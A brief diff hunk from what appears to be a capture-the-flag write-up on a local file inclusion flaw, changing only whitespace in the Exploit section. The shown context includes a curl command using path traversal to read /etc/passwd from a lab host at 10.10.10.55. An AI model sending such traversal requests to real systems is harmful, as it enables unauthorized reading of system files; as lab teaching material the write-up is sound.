@@ -17,7 +17,7 @@ Ok, the url look’s vulnerable to LFI. So let's test it
 BINGO!
 
 ## Exploit  
-Let’s use curl to get a clean view of the files
+Let’s use curl to get a clean view of the files  
 curl -v http://10.10.10.55/?file=../../../../../../../../../../../../etc/passwd  
 ![alt text](./img/included04.PNG?raw=true)  
 
